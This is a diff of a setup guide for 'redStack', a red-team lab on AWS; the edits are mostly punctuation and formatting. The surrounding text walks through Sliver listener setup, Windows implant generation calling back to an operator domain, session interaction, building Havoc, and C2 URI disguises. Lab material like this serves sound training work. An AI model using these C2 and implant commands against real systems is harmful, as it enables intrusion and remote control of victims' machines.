@@ -194,7 +194,7 @@ redStack provisions EC2, VPC, security group, Elastic IP, network interface, key
 
 **For both options:** Go to **IAM Console** > **Users** > **Create user**, set a username (e.g., `redS-operator`), then under **Security credentials** create an access key and save the Access Key ID and Secret Access Key.
 
-**Option A: AdministratorAccess (recommended — use this unless you have a reason not to)**
+**Option A: AdministratorAccess (recommended. Use this unless you have a specific reason not to)**
 
 This is the right choice for the vast majority of redStack users. If you followed the earlier recommendation and created a dedicated AWS account solely for this lab, `AdministratorAccess` is the practical default. There are no other workloads, billing resources, or sensitive data in the account to protect. Admin access on an empty account carries the same real-world risk as the scoped policy: if the credentials are compromised, the attacker can only touch the lab infrastructure you already plan to tear down.
 
@@ -449,9 +449,9 @@ If you are new to Terraform, here is a quick overview of the four commands used 
 | Command | What it does |
 | --- | --- |
 | `terraform init` | Downloads provider plugins and initializes the working directory. Run once before anything else, or after adding new providers. |
-| `terraform plan` | Dry run. Shows exactly what Terraform will create, change, or destroy — no changes are made. Also useful for catching syntax or provisioning errors before a full `terraform apply`. |
+| `terraform plan` | Dry run. Shows exactly what Terraform will create, change, or destroy. No changes are made. Useful for catching syntax or provisioning errors before a full `terraform apply`. |
 | `terraform apply` | Provisions the infrastructure defined in your `.tf` files. Terraform will print the plan and prompt you to type `yes` before making any changes. |
-| `terraform destroy` | Tears down **all** infrastructure managed by Terraform in this directory. You will be prompted to confirm. Use this when you are done with the lab to avoid ongoing AWS charges. Before redeploying, verify the destroy completed cleanly by checking your [AWS EC2 Dashboard](https://console.aws.amazon.com/ec2/home) — all redStack instances should show as terminated and no Elastic IPs should remain allocated. |
+| `terraform destroy` | Tears down all infrastructure managed by Terraform in this directory. You will be prompted to confirm. Run this when you are done with the lab to avoid ongoing AWS charges. Before redeploying, verify the destroy completed cleanly: check your [AWS EC2 Dashboard](https://console.aws.amazon.com/ec2/home) and confirm all redStack instances show as terminated and no Elastic IPs remain allocated. |
 
 For full command reference, see the [Terraform CLI documentation](https://developer.hashicorp.com/terraform/cli/commands).
 
@@ -466,7 +466,7 @@ The [AWS EC2 Dashboard](https://console.aws.amazon.com/ec2/home) is your primary
 | --- | --- | --- |
 | **Instances** | EC2 → Instances → Instances | All 6 redStack instances should show `running` after `terraform apply`. After `terraform destroy`, all should show `terminated`. |
 | **Elastic IPs** | EC2 → Network & Security → Elastic IPs | Two EIPs are allocated at deploy time (Guacamole, Redirector). After `terraform destroy`, both should be released (not listed). Unreleased EIPs incur charges. |
-| **Key Pairs** | EC2 → Network & Security → Key Pairs | Confirm `rs-rsa-key` exists before deploying. Terraform does not create this — it must be present or `terraform apply` will fail. |
+| **Key Pairs** | EC2 → Network & Security → Key Pairs | Confirm `rs-rsa-key` exists before deploying. Terraform does not create this. It must be present or `terraform apply` will fail. |
 | **VPCs** | VPC → Your VPCs | Two VPCs are created: TeamServer VPC (`172.31.0.0/16`) and Redirector VPC (`10.60.0.0/16`). After destroy, both should be gone. |
 
 **Quick region check:** Make sure the AWS Console region (top-right dropdown) matches the region in your `terraform.tfvars` (`us-east-1` by default). Resources created in one region are invisible when viewing another.
@@ -493,7 +493,7 @@ terraform init
 
 **Expected Output:**
 
-```text
+```console
 Initializing the backend...
 Initializing provider plugins...
 - Finding hashicorp/aws versions matching "~> 5.0"...
@@ -534,7 +534,7 @@ Type `yes` when prompted.
 
 **Expected Output:**
 
-```text
+```console
 Apply complete! Resources: 50+ added, 0 changed, 0 destroyed.
 ```
 
@@ -550,7 +550,7 @@ terraform output network_architecture
 ```
 
 > [!TIP]
-> Save `deployment_info` to a file for quick offline reference — you will need the IPs, credentials, and C2 header throughout this guide.
+> Save `deployment_info` to a file for quick offline reference. You will need the IPs, credentials, and C2 header throughout this guide.
 
 **Checkpoint:** ✅ Deployment info reviewed, IPs and credentials noted
 
@@ -659,7 +659,7 @@ All SSH connections use password auth (no keys needed) pre-configured with the a
 ### Step 2.2: Access Windows Workstation
 
 1. Click **"Windows Operator Workstation"**
-2. RDP connects automatically. Wait 10–30 seconds for the desktop to load.
+2. RDP connects automatically. Wait 10-30 seconds for the desktop to load.
 3. Verify the following are installed: Chromium, VS Code, MobaXterm, 7-Zip
 4. Open MobaXterm. The **redStack Lab** folder in the sidebar should contain pre-configured SSH sessions for all lab machines.
 
@@ -732,7 +732,7 @@ Certbot will walk you through a few prompts:
 <details>
 <summary>Certbot walkthrough and expected output</summary>
 
-```text
+```console
 Saving debug log to /var/log/letsencrypt/letsencrypt.log
 Enter email address (used for urgent renewal and security notices)
  (Enter 'c' to cancel): you@youremail.com
@@ -789,7 +789,7 @@ sudo /home/admin/test_redirector.sh
 <details>
 <summary>Key sections of expected output</summary>
 
-```text
+```console
 ===== Redirector Connectivity Test =====
 
 [*] Apache status:
@@ -1126,7 +1126,7 @@ sliver-client
 
 **On first login only:** import the pre-built C2 profile. This only needs to be done once per deployment since Sliver stores it in its database:
 
-```text
+```console
 sliver > c2profiles import --file /home/admin/redstack-c2-profile.json --name redstack
 ```
 
@@ -1135,14 +1135,14 @@ sliver > c2profiles import --file /home/admin/redstack-c2-profile.json --name re
 
 **Start the HTTP listener:**
 
-```text
+```console
 sliver > http --lhost 0.0.0.0 --lport 80
 ```
 
 This starts a plain HTTP listener on port 80. The implant connects over HTTPS to the redirector, which terminates SSL and forwards plain HTTP internally to Sliver on port 80.
 
 > [!WARNING]
-> SSL terminates at the Apache redirector. Sliver receives plain HTTP on port 80 internally — the implant callback URL remains `https://yourdomain/...` so traffic is encrypted from the target's perspective.
+> SSL terminates at the Apache redirector. Sliver receives plain HTTP on port 80 internally. The implant callback URL remains `https://yourdomain/...` so traffic is encrypted from the target's perspective.
 
 **Checkpoint:** ✅ Sliver HTTP listener running on port 80
 
@@ -1150,7 +1150,7 @@ This starts a plain HTTP listener on port 80. The implant connects over HTTPS to
 
 Generate the implant using the `redstack` C2 profile:
 
-```text
+```console
 sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
 ```
 
@@ -1173,14 +1173,14 @@ Execute the implant on the Windows workstation. You should see a new session app
 
 ### Step 5.4: Test Sliver Session
 
-```text
+```console
 sliver > sessions
 ```
 
 > [!TIP]
 > Use `sessions -i [SESSION_ID]` to list and interact with a session in one command instead of two steps.
 
-```text
+```console
 sliver > use [SESSION_ID]
 
 sliver (SESSION) > whoami
@@ -1220,11 +1220,11 @@ Unlike other C2 servers in the lab, Havoc is **not pre-built**. The Go compiler,
 ~/build_havoc.sh
 ```
 
-The script logs everything to `~/havoc_build.log` and takes **15–25 minutes** to complete. It is safe to re-run if anything fails.
+The script logs everything to `~/havoc_build.log` and takes **15-25 minutes** to complete. It is safe to re-run if anything fails.
 
 When complete you will see:
 
-```text
+```console
 ===== Havoc Build Complete ...
 ```
 
@@ -1374,7 +1374,7 @@ sudo tail -20 /var/log/apache2/redirector-access.log
 
 URI prefixes in the logs identify which C2 is receiving traffic:
 
-```text
+```ini
 /cdn/media/stream/      = Mythic
 /cloud/storage/objects/ = Sliver
 /edge/cache/assets/     = Havoc
@@ -1514,7 +1514,7 @@ Each Guacamole SSH connection should connect without a password prompt and land 
 
 **Symptoms:** Apache fails to start, `apache2ctl -S` shows:
 
-```text
+```console
 Invalid command '404:', perhaps misspelled or defined by a module not included
 ```
 
@@ -1543,7 +1543,7 @@ sudo apache2ctl configtest && sudo systemctl reload apache2
 
 **Symptoms:** `mythic_nginx` container keeps restarting. Logs show:
 
-```text
+```console
 [emerg] cannot load certificate "/etc/ssl/private/mythic-cert.crt": No such file or directory
 ```
 
